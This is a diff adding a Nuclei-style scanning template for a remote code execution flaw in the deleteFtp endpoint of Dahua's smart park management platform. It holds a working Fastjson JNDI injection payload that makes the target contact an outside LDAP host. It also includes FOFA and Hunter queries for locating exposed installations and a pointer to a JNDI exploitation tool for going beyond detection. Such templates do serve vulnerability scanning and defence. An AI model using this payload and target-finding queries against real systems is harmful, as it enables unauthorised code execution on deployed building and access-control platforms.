@@ -1,0 +1,33 @@
+id: dahua-wpms-deleteftp-rce
+
+info:
+  name: 大华智慧园区综合管理平台 deleteFtp - rce
+  author: yy
+  severity: critical
+  description: 
+  reference:
+    - todo
+  metadata:
+    veified: true
+    fofa-qeury: app="dahua-智慧园区综合管理平台"
+    hunter-query: app.name="Dahua 大华 智慧园区管理平台"
+    tips: ldap利用 https://github.com/Jeromeyoung/JNDIExploit-1/tree/master  
+  tags: dahua,rce,wpms,iot,oob
+  
+http:
+  - raw:
+      - |
+        POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}
+               
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
